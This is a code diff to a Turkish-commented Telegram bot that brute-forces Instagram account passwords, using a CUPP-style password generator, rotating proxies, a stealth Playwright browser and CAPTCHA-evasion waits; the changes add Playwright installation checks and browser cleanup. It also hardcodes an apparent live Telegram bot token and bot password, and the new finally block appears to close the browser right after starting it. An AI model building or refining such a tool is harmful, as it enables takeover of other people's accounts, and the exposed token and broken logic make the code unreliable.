@@ -6,6 +6,8 @@ import json
 import re
 import requests
 import itertools
+import subprocess
+import os
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -17,7 +19,6 @@ from telegram.ext import (
     ContextTypes,
 )
 from telegram.error import TelegramError
-import os
 from playwright.async_api import async_playwright
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -30,6 +31,25 @@ TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"
 
 # Güvenlik şifresi
 BOT_PASSWORD = "vio1911"
+
+# Playwright tarayıcılarının yüklü olup olmadığını kontrol et
+def check_playwright_installation():
+    """Playwright tarayıcılarının yüklü olup olmadığını kontrol eder ve gerekirse yükler."""
+    try:
+        # Playwright'in yüklü olup olmadığını kontrol etmek için basit bir komut
+        result = subprocess.run(['playwright', '--version'], capture_output=True, text=True)
+        if result.returncode != 0:
+            raise Exception("Playwright yüklü değil veya çalıştırılamıyor.")
+    except Exception as e:
+        logger.error(f"Playwright kontrol hatası: {e}")
+        logger.info("Playwright tarayıcılarını yüklüyorum...")
+        try:
+            subprocess.run(['playwright', 'install'], check=True)
+            subprocess.run(['playwright', 'install-deps'], check=True)  # Linux bağımlılıkları için
+            logger.info("Playwright tarayıcıları başarıyla yüklendi.")
+        except subprocess.CalledProcessError as install_error:
+            logger.error(f"Playwright yükleme hatası: {install_error}")
+            raise Exception("Playwright tarayıcıları yüklenemedi. Lütfen terminalde 'playwright install' komutunu çalıştırın.")
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
 class PasswordGenerator:
@@ -155,6 +175,9 @@ class InstagramBruteForce:
     async def _initialize_playwright(self):
         """Playwright'ı başlat ve tarayıcıyı stealth modda ayarla"""
         try:
+            # Playwright'in yüklü olduğunu kontrol et
+            check_playwright_installation()
+
             self.playwright = await async_playwright().start()
             screen_width = random.randint(1280, 1920)
             screen_height = random.randint(720, 1080)
@@ -210,7 +233,16 @@ class InstagramBruteForce:
             return True
         except Exception as e:
             logger.error(f"Playwright başlatma hatası: {e}")
-            return False
+            if "Executable doesn't exist" in str(e):
+                return False
+            raise  # Diğer hataları tekrar fırlat
+        finally:
+            if self.browser:
+                await self.browser.close()
+                self.browser = None
+            if self.playwright:
+                await self.playwright.stop()
+                self.playwright = None
 
     async def _get_working_proxy(self, progress_callback: Optional[callable] = None):
         """Çalışan proxy bul (multi-thread)"""
@@ -287,18 +319,19 @@ class InstagramBruteForce:
     async def _playwright_login_attempt(self, username: str, password: str):
         """Playwright ile login denemesi"""
         try:
-            if not self.page:
+            if not self.page or not await self._initialize_playwright():
+                self.current_proxy = await self._get_working_proxy(None)
                 if not await self._initialize_playwright():
-                    self.current_proxy = await self._get_working_proxy(None)
+                    logger.error("Playwright başlatılamadı, tarayıcı eksik.")
                     return "ERROR"
             
-            await self.page.goto(self.login_url)
+            await self.page.goto(self.login_url, timeout=30000)
             await self.page.wait_for_selector('input[name="username"]', timeout=10000)
             
             if await self.page.query_selector('img[src*="captcha"]'):
                 logger.info("CAPTCHA tespit edildi, bekleniyor...")
                 await asyncio.sleep(random.uniform(30, 60))
-                await self.page.goto(self.login_url)
+                await self.page.goto(self.login_url, timeout=30000)
                 self.current_proxy = await self._get_working_proxy(None)
                 return "SUSPECTED"
             
@@ -351,8 +384,10 @@ class InstagramBruteForce:
         finally:
             if self.browser:
                 await self.browser.close()
+                self.browser = None
             if self.playwright:
                 await self.playwright.stop()
+                self.playwright = None
 
     async def brute_force(self, username: str, password_list: List[str], timeout: int, 
                          progress_callback: Optional[callable] = None, stop_event: asyncio.Event = None):
@@ -511,6 +546,12 @@ class TelegramBot:
         user_id = update.effective_user.id
         self._initialize_user_data(user_id)
         try:
+            # Playwright'in yüklü olduğunu kontrol et
+            try:
+                check_playwright_installation()
+            except Exception as e:
+                await update.message.reply_text(f"❌ Playwright başlatma hatası: {str(e)}\nLütfen terminalde 'playwright install' komutunu çalıştırın.")
+                return
             await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
             context.user_data['awaiting'] = 'password'
         except TelegramError as e:
